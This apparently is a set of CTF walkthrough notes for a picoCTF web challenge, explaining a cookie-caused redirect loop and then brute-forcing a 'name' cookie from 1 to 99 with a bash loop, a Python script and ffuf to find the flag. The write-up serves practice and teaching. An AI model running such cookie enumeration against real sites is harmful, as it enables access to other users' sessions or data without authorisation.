# curl basic | follow, cookeie handling
The mystery of the infinite loop is solved! Take a look at that `Set-Cookie` header:

`Set-Cookie: name=-1; Path=/`

The server is trying to give you a cookie named **"name"** with the value **"-1"**. When you used `curl -L` earlier, `curl` followed the redirect but **discarded the cookie**. The server, seeing a request without the cookie it just tried to give you, assumed you were a new visitor and sent the redirect (and the cookie) again. This created the loop.

### The Fix: Give the Cookie Back
To break the loop and actually see the content, you need to tell `curl` to store and resend that cookie. 

Run this command:
```bash
curl -L -b "" http://wily-courier.picoctf.net:58786
```
* **`-b ""`**: This is a shortcut that tells `curl` to "enable cookie handling" in memory for this session. It will receive the `name=-1` cookie and send it right back when it follows the redirect to `/`.
```

---

# cookie enumeration

To enumerate a range of cookie values efficiently, you want to automate the requests rather than typing them manually. Since the server is a Flask-based app (indicated by Werkzeug), it likely has different responses for different IDs.

Here are the best ways to tackle this.

### 1. The Bash One-Liner (Fastest Setup)
You can use a simple `for` loop in your terminal. This will iterate from 1 to 99, sending the cookie value in the header and printing the result.

```bash
for i in {1..99}; do 
  echo -n "Testing name=$i: "; 
  curl -s -b "name=$i" http://wily-courier.picoctf.net:58786/check | grep -i "picoCTF"
done
```
* **`-s` (Silent):** Hides the progress bar so you only see the results.
* **`-b "name=$i"`:** Sets the cookie for each request.
* **`grep -i "picoCTF"`:** This is the "Filter." It will only show you a line if it actually contains the flag, keeping your terminal clean of "Invalid User" messages.

---

### 2. The Python Script (Best for Complex Responses)
If the flag isn't just a simple string but requires checking the status code or handling weird redirects, use the `requests` library.

```python
import requests

url = "http://wily-courier.picoctf.net:58786/check"

for i in range(1, 100):
    cookies = {'name': str(i)}
    response = requests.get(url, cookies=cookies)
    
    # Check if the response contains the flag format
    if "picoCTF" in response.text:
        print(f"Success with name={i}!")
        print(f"Flag: {response.text.strip()}")
        break
    else:
        print(f"Checked {i}...", end="\r")
```

---

### 3. Using Ffuf (The Professional Tool)
If you want to look like a pro, use **ffuf** (Fuzz Faster U Fool). It is pre-installed on many CTF environments and is incredibly fast.

```bash
ffuf -u http://wily-courier.picoctf.net:58786/check -b "name=FUZZ" -w <(seq 1 99) -mr "picoCTF"
```
* **`-b "name=FUZZ"`:** Tells ffuf to swap the word "FUZZ" with numbers from your list.
* **`-w <(seq 1 99)`:** Generates a "wordlist" of numbers 1 to 99 on the fly.
* **`-mr "picoCTF"`:** (Match Regular Expression) Only shows results that contain the flag.



### Strategy Note
Before running the full 1–99 loop, try a manual check on a couple of values (like 0, 1, and 2) to see how the server responds. If the server is slow, you might want to add `sleep 0.1` to your bash loop to avoid being rate-limited.

**Quick Question:** Does the `/check` endpoint require a GET request, or should we be POSTing the cookie data? (Based on your previous `curl`, GET is the safe bet for now).
